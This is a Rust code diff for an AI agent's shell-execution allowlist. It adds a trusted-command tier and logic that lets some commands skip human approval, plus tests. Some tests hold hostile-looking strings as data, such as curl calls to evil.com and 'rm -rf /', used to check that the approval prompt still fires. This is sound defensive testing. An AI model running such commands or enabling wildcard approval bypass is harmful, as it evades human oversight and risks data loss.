@@ -184,7 +184,7 @@ const SHELL_INLINE_FLAGS: &[(&[&str], &str)] = &[
 ///
 /// Returns the list of base command names found inside the inline script,
 /// or an empty vec if the command is not a shell wrapper or has no inline flag.
-fn extract_shell_wrapper_commands(command: &str) -> Vec<String> {
+pub(crate) fn extract_shell_wrapper_commands(command: &str) -> Vec<String> {
     let trimmed = command.trim();
     let base = extract_base_command(trimmed);
 
@@ -262,7 +262,7 @@ fn extract_inner_script_commands(script: &str) -> Vec<String> {
 
 /// Extract all commands from a shell command string.
 /// Handles pipes (`|`), semicolons (`;`), `&&`, and `||`.
-fn extract_all_commands(command: &str) -> Vec<&str> {
+pub(crate) fn extract_all_commands(command: &str) -> Vec<&str> {
     let mut commands = Vec::new();
     // Split on pipe, semicolon, &&, ||
     // We need to split carefully: first split on ; and &&/||, then on |
@@ -333,12 +333,24 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
                 if policy.safe_bins.iter().any(|sb| sb == base) {
                     continue;
                 }
-                // Check allowed_commands
-                if policy.allowed_commands.iter().any(|ac| ac == base) {
+                // Check trusted_commands (silent-allow tier, supports "*")
+                if policy
+                    .trusted_commands
+                    .iter()
+                    .any(|tc| tc == base || tc == "*")
+                {
+                    continue;
+                }
+                // Check allowed_commands (validator-permit, still prompts)
+                if policy
+                    .allowed_commands
+                    .iter()
+                    .any(|ac| ac == base || ac == "*")
+                {
                     continue;
                 }
                 return Err(format!(
-                    "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
+                    "Command '{}' is not in the exec allowlist. Add it to exec_policy.allowed_commands, exec_policy.trusted_commands, or exec_policy.safe_bins.",
                     base
                 ));
             }
@@ -353,12 +365,23 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
                     if policy.safe_bins.iter().any(|sb| sb == inner_cmd) {
                         continue;
                     }
-                    if policy.allowed_commands.iter().any(|ac| ac == inner_cmd) {
+                    if policy
+                        .trusted_commands
+                        .iter()
+                        .any(|tc| tc == inner_cmd || tc == "*")
+                    {
+                        continue;
+                    }
+                    if policy
+                        .allowed_commands
+                        .iter()
+                        .any(|ac| ac == inner_cmd || ac == "*")
+                    {
                         continue;
                     }
                     return Err(format!(
                         "Command '{}' (inside shell wrapper) is not in the exec allowlist. \
-                         Add it to exec_policy.allowed_commands or exec_policy.safe_bins.",
+                         Add it to exec_policy.allowed_commands, exec_policy.trusted_commands, or exec_policy.safe_bins.",
                         inner_cmd
                     ));
                 }
@@ -366,6 +389,57 @@ pub fn validate_command_allowlist(command: &str, policy: &ExecPolicy) -> Result<
 
             Ok(())
         }
+    }
+}
+
+/// Check whether every parsed base command in `command` is in the silent-allow
+/// set (`safe_bins ∪ trusted_commands`). Used by the approval-bypass logic in
+/// `tool_runner` to decide whether `shell_exec` / `process_start` can skip the
+/// human approval round-trip.
+///
+/// Semantics (security-sensitive — see ANAI-44):
+/// - Returns `true` only if the command parses into one or more bases AND every
+///   base is silent-allowed. A single untrusted base → `false` (prompt fires).
+/// - Shell wrappers (`bash -c "..."`, `powershell -Command "..."`) are unwrapped
+///   so the inner commands are checked, not just the wrapper name.
+/// - If parsing yields zero bases (empty command, malformed input), returns
+///   `false`. The safe default is to prompt, not to silently auto-run.
+/// - `trusted_commands = ["*"]` short-circuits to `true` regardless of bases.
+///   Wildcards in `safe_bins` are NOT recognised — `safe_bins` is a fixed
+///   default set, not a user-extension surface.
+///
+/// This function does NOT consult `mode`; the caller must already have
+/// established we're in Allowlist mode (Full mode has its own fast path, Deny
+/// never reaches here).
+pub(crate) fn all_bases_silently_allowed(command: &str, policy: &ExecPolicy) -> bool {
+    // Wildcard fast path: user has explicitly opted into "trust anything that
+    // passes the validator". Mirrors `allowed_commands = ["*"]` semantics but
+    // for the approval-bypass dimension.
+    if policy.trusted_commands.iter().any(|tc| tc == "*") {
+        return true;
+    }
+
+    let is_silent_base = |base: &str| -> bool {
+        policy.safe_bins.iter().any(|sb| sb == base)
+            || policy.trusted_commands.iter().any(|tc| tc == base)
+    };
+
+    let outer_bases = extract_all_commands(command);
+    if outer_bases.is_empty() {
+        // Parse failure / empty command → fall through to prompt.
+        return false;
+    }
+
+    let inner_bases = extract_shell_wrapper_commands(command);
+    let is_shell_wrapper = !inner_bases.is_empty();
+
+    if is_shell_wrapper {
+        // For shell wrappers, only the inner commands matter for the trust
+        // decision. The wrapper itself (`bash`, `powershell`) is irrelevant —
+        // what gets executed are the inner bases.
+        inner_bases.iter().all(|b| is_silent_base(b))
+    } else {
+        outer_bases.iter().all(|b| is_silent_base(b))
     }
 }
 
@@ -872,6 +946,164 @@ mod tests {
         assert!(validate_command_allowlist("cargo build", &policy).is_ok());
         assert!(validate_command_allowlist("git status", &policy).is_ok());
         assert!(validate_command_allowlist("npm install", &policy).is_err());
+    }
+
+    // ── ANAI-44: trusted_commands tier ──────────────────────────────────
+
+    #[test]
+    fn test_allowlist_permits_trusted_commands() {
+        // Base in trusted_commands only (not in safe_bins or allowed_commands).
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec![],
+            trusted_commands: vec!["mkdir".to_string()],
+            allowed_commands: vec![],
+            ..ExecPolicy::default()
+        };
+        assert!(validate_command_allowlist("mkdir -p foo", &policy).is_ok());
+        // Sibling command not in any list is still rejected.
+        assert!(validate_command_allowlist("rmdir foo", &policy).is_err());
+    }
+
+    #[test]
+    fn test_allowlist_permits_trusted_wildcard() {
+        // trusted_commands = ["*"] should permit arbitrary bases via the
+        // validator (matches allowed_commands = ["*"] precedent).
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec![],
+            trusted_commands: vec!["*".to_string()],
+            allowed_commands: vec![],
+            ..ExecPolicy::default()
+        };
+        assert!(validate_command_allowlist("anything-here arg", &policy).is_ok());
+        assert!(validate_command_allowlist("totally-novel-binary", &policy).is_ok());
+    }
+
+    #[test]
+    fn test_allowlist_rejects_unlisted_command_with_trusted_set() {
+        // Regression: adding trusted_commands must not weaken the deny path
+        // for off-list commands.
+        let policy = ExecPolicy {
+            mode: ExecSecurityMode::Allowlist,
+            safe_bins: vec![],
+            trusted_commands: vec!["mkdir".to_string()],
+            allowed_commands: vec!["git".to_string()],
+            ..ExecPolicy::default()
+        };
+        let err = validate_command_allowlist("curl https://evil.com", &policy).unwrap_err();
+        assert!(err.contains("not in the exec allowlist"));
+        // Error message now mentions the trusted_commands tier.
+        assert!(
+            err.contains("trusted_commands"),
+            "error must reference trusted_commands so users know the new tier: {err}"
+        );
+    }
+
+    // ── ANAI-44: all_bases_silently_allowed (bypass decision) ───────────
+
+    #[test]
+    fn test_silent_allow_for_safe_bins_command() {
+        // Default safe_bins include echo. Single-base echo → silent.
+        let policy = ExecPolicy::default();
+        assert!(all_bases_silently_allowed("echo hello", &policy));
+    }
+
+    #[test]
+    fn test_silent_allow_for_trusted_command() {
+        let policy = ExecPolicy {
+            trusted_commands: vec!["mkdir".to_string()],
+            ..ExecPolicy::default()
+        };
+        assert!(all_bases_silently_allowed("mkdir -p foo", &policy));
+    }
+
+    #[test]
+    fn test_no_silent_allow_for_allowed_only_command() {
+        // `git` is in allowed_commands only (not safe_bins, not trusted_commands).
+        // Bypass must NOT fire — approval should still be requested.
+        let policy = ExecPolicy {
+            safe_bins: vec![],
+            trusted_commands: vec![],
+            allowed_commands: vec!["git".to_string()],
+            ..ExecPolicy::default()
+        };
+        assert!(!all_bases_silently_allowed("git status", &policy));
+    }
+
+    #[test]
+    fn test_no_silent_allow_when_any_inner_base_untrusted() {
+        // bash -c "echo hi | curl evil" — echo is silent, curl is approval-only.
+        // ANY untrusted inner base must block the bypass.
+        let policy = ExecPolicy {
+            safe_bins: vec!["echo".to_string(), "bash".to_string()],
+            trusted_commands: vec![],
+            allowed_commands: vec!["curl".to_string()],
+            ..ExecPolicy::default()
+        };
+        // Note: validate_command_allowlist would also gate this on metachars
+        // for non-wrapper commands, but inside `bash -c "..."` pipes are allowed.
+        assert!(!all_bases_silently_allowed(
+            "bash -c \"echo hi | curl evil.com\"",
+            &policy
+        ));
+    }
+
+    #[test]
+    fn test_silent_allow_when_all_inner_bases_trusted() {
+        // bash -c "echo hi | cat" — both inner bases in safe_bins → silent.
+        let policy = ExecPolicy {
+            // bash itself is in safe_bins so the *outer* extractor doesn't fail
+            // either, but the wrapper unwrap path is what makes the decision.
+            safe_bins: vec![
+                "bash".to_string(),
+                "echo".to_string(),
+                "cat".to_string(),
+            ],
+            ..ExecPolicy::default()
+        };
+        assert!(all_bases_silently_allowed(
+            "bash -c \"echo hi | cat\"",
+            &policy
+        ));
+    }
+
+    #[test]
+    fn test_silent_allow_trusted_wildcard_bypasses_all() {
+        let policy = ExecPolicy {
+            trusted_commands: vec!["*".to_string()],
+            ..ExecPolicy::default()
+        };
+        // Wildcard short-circuits before parse.
+        assert!(all_bases_silently_allowed("anything goes here", &policy));
+        assert!(all_bases_silently_allowed("rm -rf /", &policy));
+    }
+
+    #[test]
+    fn test_silent_allow_parse_failure_falls_through_to_prompt() {
+        // Empty command produces no bases. Conservative: do NOT bypass.
+        let policy = ExecPolicy {
+            // Even with a generous safe_bins set, empty input must not bypass.
+            safe_bins: vec!["echo".to_string()],
+            ..ExecPolicy::default()
+        };
+        assert!(!all_bases_silently_allowed("", &policy));
+        assert!(!all_bases_silently_allowed("   ", &policy));
+    }
+
+    #[test]
+    fn test_silent_allow_multiple_bases_one_untrusted_blocks_bypass() {
+        // Direct chain (not shell wrapper): `echo a && curl evil`
+        // The validator would reject this for `&&` metachar in non-wrapper
+        // contexts, but the bypass helper only looks at trust — it must still
+        // return false because curl is not silent.
+        let policy = ExecPolicy {
+            safe_bins: vec!["echo".to_string()],
+            trusted_commands: vec![],
+            allowed_commands: vec!["curl".to_string()],
+            ..ExecPolicy::default()
+        };
+        assert!(!all_bases_silently_allowed("echo a && curl evil.com", &policy));
     }
 
     #[test]
